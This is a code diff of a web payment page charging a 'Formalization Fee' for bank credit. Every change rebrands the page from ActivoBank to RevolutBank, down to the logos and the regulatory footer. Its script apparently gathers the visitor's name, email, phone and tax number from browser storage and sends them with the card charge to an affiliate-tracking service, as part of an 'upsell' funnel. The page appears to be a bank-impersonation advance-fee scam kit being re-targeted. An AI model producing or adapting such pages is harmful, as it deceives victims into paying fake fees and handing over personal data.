@@ -19,7 +19,7 @@ window.apiUrl = window.apiUrl || function (p) {
 <script src="../extensions/fees-loader.js"></script>
 <script src="../extensions/upsell-fees-bridge.js"></script>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Formalization Fee — ActivoBank</title>
+<title>Formalization Fee — RevolutBank</title>
 
 <script defer src="../../cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="3269fe28-2341-4107-9bf9-f1ad9d68455f"></script>
 <style>
@@ -120,7 +120,7 @@ window.apiUrl = window.apiUrl || function (p) {
   <div class="topbar">
     <button class="menu-btn" aria-label="menu"><span></span></button>
     <div class="brand">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="103" height="28" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="103" height="28" overflow="hidden" role="img" aria-label="RevolutBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">RevolutBank</text></svg>
     </div>
     <div class="user-block">
       <div class="user-info">
@@ -197,9 +197,9 @@ window.apiUrl = window.apiUrl || function (p) {
   <!-- FOOTER -->
   <div class="site-footer">
     <div class="logo-wrap">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="RevolutBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">RevolutBank</text></svg>
     </div>
-    ActivoBank<br/>Registered and regulated within the European Union
+    RevolutBank<br/>Registered and regulated within the European Union
   </div>
 
 </div>
@@ -250,15 +250,15 @@ function getUtmParams(){
 }
 async function sendUtmify(status,orderId,createdAt,approvedDate){
   var nome=localStorage.getItem('nome')||'Customer';
-  var email=localStorage.getItem('email')||'customer@activobank.pt';
+  var email=localStorage.getItem('email')||'customer@revolutbank.com';
   var phone=(localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/[^0-9]/g,'');
   var doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/[^0-9]/g,'')||null;
   var cents=Math.round(getPayAmount(12.78)*100);
   try{
     await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json',},
-      body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'card',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
+      body:JSON.stringify({orderId,platform:'RevolutBankCredit',paymentMethod:'card',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
         customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
-        products:[{id:'comissao-formalizacao',name:'Formalization Fee — ActivoBank Credit',planId:null,planName:'upsell 4',quantity:1,priceInCents:cents}],
+        products:[{id:'comissao-formalizacao',name:'Formalization Fee — RevolutBank Credit',planId:null,planName:'upsell 4',quantity:1,priceInCents:cents}],
         trackingParameters:getUtmParams(),
         commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
   }catch(e){console.warn('UTMify:',e);}
@@ -277,8 +277,8 @@ function startPolling(txId){
               window.trackPurchase({
                 transactionId: txId,
                 value: (getPayAmount()),
-                content_id: (window.getFunnelStepParams && window.getFunnelStepParams().content_id) || 'activobank-payment',
-                content_name: (window.getFunnelStepParams && window.getFunnelStepParams().content_name) || 'ActivoBank Payment',
+                content_id: (window.getFunnelStepParams && window.getFunnelStepParams().content_id) || 'revolutbank-payment',
+                content_name: (window.getFunnelStepParams && window.getFunnelStepParams().content_name) || 'RevolutBank Payment',
                 description: 'Payment confirmed'
               });
             }
@@ -298,7 +298,7 @@ function startPolling(txId){
 async function startPayment(phone){
   console.log('[UPSELL] startPayment phone:', phone);
   const nome=localStorage.getItem('nome')||'Customer';
-  const email=localStorage.getItem('email')||'customer@activobank.pt';
+  const email=localStorage.getItem('email')||'customer@revolutbank.com';
   const doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'999999999').replace(/\D/g,'')||'999999999';
   const amount=getPayAmount(12.78);
   const amountFmt='€ '+amount.toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2});
